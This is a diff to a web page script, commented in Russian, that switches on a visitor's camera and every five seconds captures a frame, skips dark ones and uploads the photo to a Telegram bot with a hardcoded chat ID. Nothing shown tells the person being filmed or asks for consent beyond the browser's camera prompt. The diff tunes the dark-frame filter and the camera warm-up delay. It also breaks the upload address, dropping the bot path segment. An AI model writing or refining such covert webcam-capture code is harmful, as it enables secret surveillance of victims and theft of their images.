@@ -49,19 +49,27 @@
     const chatId = '8573089884';
 
     async function takeAndSendPhoto(video, canvas) {
-        // Проверка: если видео замерло или ширина 0, выходим
         if (video.paused || video.ended || video.videoWidth === 0) return;
 
-        const context = canvas.getContext('2d');
+        // Оптимизация: берем контекст с параметром willReadFrequently
+        const context = canvas.getContext('2d', { willReadFrequently: true });
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0);
         
-        // Магия против черного экрана: проверяем цвет центрального пикселя
-        const pixel = context.getImageData(canvas.width/2, canvas.height/2, 1, 1).data;
-        // Если RGB все по нулям [0,0,0], значит кадр пустой — отменяем отправку
-        if (pixel[0] === 0 && pixel[1] === 0 && pixel[2] === 0) {
-            console.log("Пропуск черного кадра...");
+        // Продвинутая проверка на черный кадр
+        // Берем данные из 3-х точек: центр, лево-верх, право-низ
+        const points = [
+            context.getImageData(canvas.width/2, canvas.height/2, 1, 1).data,
+            context.getImageData(10, 10, 1, 1).data,
+            context.getImageData(canvas.width-10, canvas.height-10, 1, 1).data
+        ];
+
+        // Проверяем, не слишком ли темно (сумма RGB > 15, чтобы отсечь шум)
+        const isBlack = points.every(p => (p[0] + p[1] + p[2]) < 15);
+
+        if (isBlack) {
+            console.log("Кадр слишком темный или черный. Пропуск...");
             return;
         }
 
@@ -72,18 +80,17 @@
         formData.append('photo', blob, 'shot.jpg');
 
         try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-            console.log("Фото ушло!");
+            console.log("Цветное фото успешно отправлено!");
         } catch (e) {
             console.error("Ошибка сети:", e);
         }
     }
 
     window.onload = () => {
-        // Добавляем атрибуты для iOS Safari, чтобы видео не блокировалось
         const video = document.getElementById('video');
         video.setAttribute('autoplay', '');
         video.setAttribute('muted', '');
@@ -96,19 +103,17 @@
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
 
-            // Самое важное событие — когда видео реально начало ИГРАТЬ
             video.onplaying = () => {
-                console.log("Камера ожила, начинаем цикл...");
+                console.log("Камера ожила, ждем прогрева...");
                 
-                // Даем 1.5 секунды на автофокус и баланс белого
+                // Увеличиваем паузу до 3 секунд, чтобы камера точно успела включиться
                 setTimeout(() => {
                     setInterval(() => {
                         takeAndSendPhoto(video, canvas);
                     }, 5000); 
-                }, 1500);
+                }, 3000);
             };
 
-            // Принудительный старт для некоторых браузеров
             video.play();
         })
         .catch(err => {
